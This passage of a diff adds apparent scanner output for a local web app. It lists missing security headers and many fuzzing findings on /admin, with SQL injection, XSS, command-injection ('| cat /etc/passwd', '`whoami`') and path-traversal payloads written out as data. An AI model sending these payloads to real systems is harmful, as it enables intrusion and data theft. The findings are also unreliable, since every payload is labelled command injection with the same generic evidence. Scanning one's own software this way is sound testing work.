+      "evidence": "Security header X-Permitted-Cross-Domain-Policies is not present"
+    },
+    {
+      "type": "Missing Cross-Origin-Embedder-Policy",
+      "endpoint": "http://localhost:5000/dashboard",
+      "payload": "N/A",
+      "method": "GET",
+      "evidence": "Security header Cross-Origin-Embedder-Policy is not present"
+    },
+    {
+      "type": "Missing Cross-Origin-Opener-Policy",
+      "endpoint": "http://localhost:5000/dashboard",
+      "payload": "N/A",
+      "method": "GET",
+      "evidence": "Security header Cross-Origin-Opener-Policy is not present"
+    },
+    {
+      "type": "Missing Cross-Origin-Resource-Policy",
+      "endpoint": "http://localhost:5000/dashboard",
+      "payload": "N/A",
+      "method": "GET",
+      "evidence": "Security header Cross-Origin-Resource-Policy is not present"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "id=' OR '1'='1",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "id='; DROP TABLE users; --",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "id=' UNION SELECT * FROM information_schema.tables; --",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "id=<script>alert('xss')</script>",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "id=<img src=x onerror=alert('xss')>",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "id=javascript:alert('xss')",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "id=; ls -la",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "id=| cat /etc/passwd",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "id=`whoami`",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "id=../../../etc/passwd",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "user=' OR '1'='1",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "user='; DROP TABLE users; --",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "user=' UNION SELECT * FROM information_schema.tables; --",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "user=<script>alert('xss')</script>",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "user=<img src=x onerror=alert('xss')>",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "user=javascript:alert('xss')",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "user=; ls -la",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "user=| cat /etc/passwd",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "user=`whoami`",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "user=../../../etc/passwd",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "username=' OR '1'='1",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "username='; DROP TABLE users; --",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "username=' UNION SELECT * FROM information_schema.tables; --",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "username=<script>alert('xss')</script>",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "username=<img src=x onerror=alert('xss')>",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "username=javascript:alert('xss')",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "username=; ls -la",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "username=| cat /etc/passwd",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "username=`whoami`",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "username=../../../etc/passwd",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "password=' OR '1'='1",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "password='; DROP TABLE users; --",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "password=' UNION SELECT * FROM information_schema.tables; --",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "password=<script>alert('xss')</script>",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "password=<img src=x onerror=alert('xss')>",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "password=javascript:alert('xss')",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "password=; ls -la",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "password=| cat /etc/passwd",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "password=`whoami`",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "password=../../../etc/passwd",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "email=' OR '1'='1",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "email='; DROP TABLE users; --",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "email=' UNION SELECT * FROM information_schema.tables; --",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "email=<script>alert('xss')</script>",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "email=<img src=x onerror=alert('xss')>",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "email=javascript:alert('xss')",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "email=; ls -la",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "email=| cat /etc/passwd",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "email=`whoami`",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "email=../../../etc/passwd",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "search=' OR '1'='1",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "search='; DROP TABLE users; --",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "search=' UNION SELECT * FROM information_schema.tables; --",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "search=<script>alert('xss')</script>",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "search=<img src=x onerror=alert('xss')>",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "search=javascript:alert('xss')",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "search=; ls -la",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "search=| cat /etc/passwd",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "search=`whoami`",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "search=../../../etc/passwd",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "query=' OR '1'='1",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "query='; DROP TABLE users; --",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "query=' UNION SELECT * FROM information_schema.tables; --",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "query=<script>alert('xss')</script>",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "query=<img src=x onerror=alert('xss')>",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "query=javascript:alert('xss')",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "query=; ls -la",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "query=| cat /etc/passwd",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "query=`whoami`",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "query=../../../etc/passwd",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "input=' OR '1'='1",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "input='; DROP TABLE users; --",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "input=' UNION SELECT * FROM information_schema.tables; --",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "input=<script>alert('xss')</script>",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "input=<img src=x onerror=alert('xss')>",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "input=javascript:alert('xss')",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "input=; ls -la",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "input=| cat /etc/passwd",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "input=`whoami`",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "input=../../../etc/passwd",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "data=' OR '1'='1",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "data='; DROP TABLE users; --",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "data=' UNION SELECT * FROM information_schema.tables; --",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "data=<script>alert('xss')</script>",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "data=<img src=x onerror=alert('xss')>",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "data=javascript:alert('xss')",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "data=; ls -la",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "data=| cat /etc/passwd",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "data=`whoami`",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "data=../../../etc/passwd",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "file=' OR '1'='1",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "file='; DROP TABLE users; --",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "file=' UNION SELECT * FROM information_schema.tables; --",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "file=<script>alert('xss')</script>",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "file=<img src=x onerror=alert('xss')>",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "file=javascript:alert('xss')",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "file=; ls -la",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "file=| cat /etc/passwd",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "file=`whoami`",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "file=../../../etc/passwd",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "path=' OR '1'='1",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "path='; DROP TABLE users; --",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "path=' UNION SELECT * FROM information_schema.tables; --",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "path=<script>alert('xss')</script>",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "path=<img src=x onerror=alert('xss')>",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "path=javascript:alert('xss')",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "path=; ls -la",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "path=| cat /etc/passwd",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "path=`whoami`",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "path=../../../etc/passwd",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "url=' OR '1'='1",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "url='; DROP TABLE users; --",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "url=' UNION SELECT * FROM information_schema.tables; --",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "url=<script>alert('xss')</script>",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "url=<img src=x onerror=alert('xss')>",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "url=javascript:alert('xss')",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "url=; ls -la",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "url=| cat /etc/passwd",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "url=`whoami`",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "url=../../../etc/passwd",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "redirect=' OR '1'='1",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "redirect='; DROP TABLE users; --",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "redirect=' UNION SELECT * FROM information_schema.tables; --",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "redirect=<script>alert('xss')</script>",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "redirect=<img src=x onerror=alert('xss')>",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "redirect=javascript:alert('xss')",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "redirect=; ls -la",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "redirect=| cat /etc/passwd",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "redirect=`whoami`",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
